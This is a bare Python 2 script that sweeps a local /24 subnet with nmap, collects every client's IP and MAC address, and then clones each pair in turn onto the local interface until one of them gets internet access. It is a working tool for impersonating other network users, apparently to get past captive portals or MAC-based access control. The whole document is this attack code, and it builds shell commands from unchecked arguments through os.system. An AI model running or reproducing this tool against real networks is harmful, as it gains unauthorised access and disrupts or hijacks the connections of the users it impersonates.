import sys,os
import argparse as arg
import nmap
import urllib2

parser = arg.ArgumentParser()
parser.add_argument("-a", "--address", help="IP address", required=True)
parser.add_argument("-i", "--interface", help="Interface", required=True)
argument = parser.parse_args()


def scan_(ip):
        dict_ = []
        scan = nmap.PortScanner().scan(hosts=ip + '/24',arguments='-sn ', sudo=True).get('scan')
        for i in scan.keys():
                mac = scan.get(scan.keys()[scan.keys().index(i)]).get('addresses').get('mac')
                dict_.append({'ip':i, 'mac':mac})
        return dict_

def change(ip,mac,iface):
        if mac is not None:
                gw_arr = ip.split(".")
                gw_arr[3] = "1"
                gw_address = ".".join(gw_arr)

                os.system("ip link set "+iface+" down")
                os.system("ip link set dev "+iface+" address "+mac)
                os.system("ip link set "+iface+" up")
                os.system("ip addr flush dev "+iface)
                os.system("ifconfig "+iface+" "+ip+" netmask 255.255.255.0 up")
                os.system("route add default gw "+gw_address)

                print ("Testing IP %s and MAC %s"%(ip,mac))
                os.system("ping -c 2 8.8.8.8")
                try:
                        urllib2.urlopen('http://216.58.192.142', timeout=1)
                        return True
                except: 
                        return False


def main():
        res = scan_(argument.address)
        print "IP and Mac list"
        for j in sorted(res, key = lambda i: i['ip']):
                print ("IP :%s / MAC: %s"%(j['ip'],j['mac']))
        for j in sorted(res, key = lambda i: i['ip']):
                internet_connection = change(j['ip'],j['mac'],argument.interface)
                if internet_connection:
                        break

main()
